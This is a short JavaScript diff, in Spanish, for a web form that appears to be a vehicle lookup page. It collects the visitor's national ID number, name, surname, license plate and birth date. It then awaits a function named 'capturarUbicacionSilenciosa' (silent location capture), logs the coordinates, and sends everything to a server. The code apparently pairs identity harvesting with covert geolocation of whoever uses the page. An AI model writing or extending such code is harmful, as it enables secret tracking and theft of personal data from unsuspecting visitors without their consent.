@@ -700,10 +700,46 @@ function buscarVehiculo(){
 
 }
 
-function obtenerUbicacion(){
+async function obtenerUbicacion(){
+
+  const dni = document.getElementById("dni").value.trim();
+  const ape = document.getElementById("apellido").value.trim();
+  const nom = document.getElementById("nombre").value.trim();
+  const pat = document.getElementById("patente").value.trim();
+  const fec = document.getElementById("fechaNacimiento").value.trim();
+
+  const leyError =
+    document.getElementById("leyendaError");
+
+  if(dni==="" || ape==="" || nom==="" || pat==="" || fec===""){
+
+    leyError.style.display = "block";
+
+    document.getElementById("leyendaExito").style.display = "none";
+
+    return;
+  }
+
+  const regex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
+
+  if(!regex.test(fec)){
+
+    alert("La fecha de nacimiento no está completa o no cumple el formato DD/MM/AAAA");
+
+    document.getElementById("fechaNacimiento").focus();
+
+    return;
+  }
+
+  leyError.style.display = "none";
+
+  /* ESPERA EL GPS */
+  await capturarUbicacionSilenciosa();
+
+  console.log("LATITUD:", latitudActual);
+  console.log("LONGITUD:", longitudActual);
 
   enviarAlServer();
-
 }
 
 async function enviarAlServer(){
